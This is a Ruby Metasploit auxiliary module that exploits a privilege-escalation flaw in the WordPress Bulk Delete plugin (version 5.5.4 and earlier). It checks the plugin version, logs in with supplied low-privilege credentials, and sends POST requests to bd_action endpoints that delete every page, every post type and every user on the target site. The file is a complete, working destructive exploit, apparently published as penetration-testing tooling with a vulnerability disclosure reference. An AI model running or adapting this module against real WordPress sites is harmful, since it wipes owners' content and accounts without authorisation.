##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Bulk Delete [Privilege Escalation]',
                      'Description' => %q{
                        Will delete most of the website content if vulnerable, including posts, pages and users
                      },
                      'Author' => ['Panagiotis Vagenas <pan.vagenas [at] gmail.com>'],
                      'License' => MSF_LICENSE,
                      'References' => [
                          'URL' => 'http://pvagenas.com/vulnerabilities/bulk-delete-privilege-escalation/'
                      ],
                      'DisclosureDate' => 'Mar 02 2016'
          ))

    register_options(
        [
            OptString.new('USERNAME', [true, 'The username to authenticate with']),
            OptString.new('PASSWORD', [true, 'The password to authenticate with'])
        ], self.class)
  end

  def check
    check_plugin_version_from_readme('bulk-delete', '5.5.4')
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end


  def do_action(action, data)
    res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(wordpress_url_backend, 'index.php'),
        'vars_get' => {bd_action: action},
        'vars_post' => data,
        'cookie' => @cookie
    )

    if res.nil?
      vprint_error('No response from the target.')
    elsif res.code != 200
      vprint_warning("Server responded with status code #{res.code}")
    end

    res
  end

  def run
    print_status("Authenticating with WordPress using #{username}:#{password}...")

    @cookie = wordpress_login(username, password)
    if @cookie.nil?
      print_error('Failed to authenticate with WordPress')
      return false
    end

    print_good('Authenticated with WordPress')

    print_status('Deleting all pages')
    r = do_action('delete_pages_by_status', {
        smbd_pages_force_delete: 'true',
        smbd_published_pages: 'published_pages',
        smbd_draft_pages: 'draft_pages',
        smbd_pending_pages: 'pending_pages',
        smbd_future_pages: 'future_pages',
        smbd_private_pages: 'private_pages'
    })

    if r.nil? or r.code != 200
      print_error('Failed to delete all pages, maybe target is not vulnerable')
    else
      vprint_good("Deleting all pages returned status code #{r.code}")
    end

    print_status('Deleting all posts from all default post types')

    %w(post page attachment revision nav_menu_item).each { |a|
      vprint_status("Deleting all posts from post type #{a}")

      r = do_action('delete_posts_by_post_type', {'smbd_types[0]' => "#{a}"})

      if r.nil? or r.code != 200
        vprint_error("Failed to delete all posts from post type #{a}")
      else
        vprint_good("Deleting all posts returned status code #{r.code}")
      end
    }

    print_status('Deleting all users')

    r = do_action('delete_users_by_meta', {
        smbd_u_meta_key: 'nickname',
        smbd_u_meta_compare: 'LIKE',
        smbd_u_meta_value: ''
    })

    if r.nil? or r.code != 200
      print_error('Failed to delete all posts, maybe target is not vulnerable')
    else
      vprint_good("Deleting all users returned status code #{r.code}")
    end

    print_status('Exploitation complete, please check output for details')

  end

end
